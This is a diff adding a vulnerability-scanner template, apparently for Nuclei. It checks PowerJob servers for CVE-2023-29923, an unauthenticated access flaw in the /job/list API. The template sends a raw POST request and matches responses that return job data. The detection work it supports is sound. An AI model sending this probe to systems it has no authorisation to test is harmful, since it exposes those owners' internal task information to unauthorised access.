@@ -1,0 +1,37 @@
+id: powerjob-unauthorized-access
+
+info:
+  name: PowerJob /job/list API Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    PowerJob (formerly OhMyScheduler) is a distributed scheduling and computing framework. An unauthorized access vulnerability in the /job/list endpoint allows attackers to retrieve sensitive task information, leading to potential system compromise.
+  classification:
+    cve-id: CVE-2023-29923
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
+    cvss-score: 7.3
+  tags: unauthorized-access
+
+http:
+  - raw:
+      - |
+        POST /job/list HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 35
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json;charset=UTF-8
+        Connection: close
+        Accept: application/json, text/plain
+
+        {"appId":1,"index":0,"pageSize":10}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true,'
+          - ',"data":['
+          - ',"jobName":'
+      - type: status
+        status:
+          - 200
